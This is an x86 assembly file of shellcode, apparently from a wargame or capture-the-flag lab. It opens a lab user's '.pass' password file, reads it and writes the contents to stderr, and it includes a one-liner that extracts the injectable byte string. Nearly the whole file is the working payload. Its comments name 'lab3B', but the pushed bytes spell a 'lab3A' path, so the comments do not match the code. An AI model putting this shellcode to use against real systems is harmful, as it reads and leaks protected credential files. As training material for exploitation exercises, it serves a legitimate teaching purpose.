; Author: Abhinav Thakur
; Email : compilepeace@gmail.com
; Description : reads "/home/lab3B/.pass" file.

; Compile : yasm -f elf ./read_flag.asm
; Harness : $ for i in $(objdump -d ./shell.o | grep "^ " | cut -f2);do echo -n \\x$i; done
; x86 system calling convention : eax (syscall number) | ebx ecx edx esi edi ebp
; x86-64 sys calling convention : rax (syscall number) | rdi rsi rdx rcx r8  r9 

%define SYS_OPEN    5
%define SYS_READ    3
%define SYS_WRITE   4
%define SYS_EXIT    1
%define READ_CNT    0x101

; grep -Ril "o_rdonly" /usr/include --> /usr/include/asm-generic/fcntl.h
%define O_RDONLY    0
%define STDERR      2 

segment .text
global _start

_start:
    
    ; int open(const char *pathname, int flags);
    xor ecx, ecx        ; flags     = O_RDONLY
    push ecx            
    push 0x73736170     ; "ssap"
    push 0x2e2f4133     ; "./A3"
    push 0x62616c2f     ; "bal/"
    push 0x656d6f68     ; "emoh"
    push 0x2f2f2f2f     ; "////"
    lea ebx, [esp + 3]  ; pathname  = "/home/lab3B/.pass"   
    mov eax, ecx        
    add al, SYS_OPEN    ; syscall number = SYS_OPEN
    int 0x80

    ; ssize_t read(int fd, void *buf, size_t count);
    mov ebx, eax        ; fd = open()
    sub sp, READ_CNT         
    mov ecx, esp        ; buf = &stack
    xor edx, edx
    mov dx, READ_CNT    ; count = READ_CNT
    xor eax, eax
    mov al, SYS_READ
    int 0x80

    ; ssize_t write(int fd, const void *buf, size_t count);
    xor ebx, ebx
    mov bl, STDERR      ; fd = STDERR_FILENO
    xor eax, eax
    mov al, SYS_WRITE
    int 0x80

    ; void _exit(int status);
    xor eax, eax
    mov ebx, eax
    mov bl, 0x9
    mov al, SYS_EXIT
    int 0x80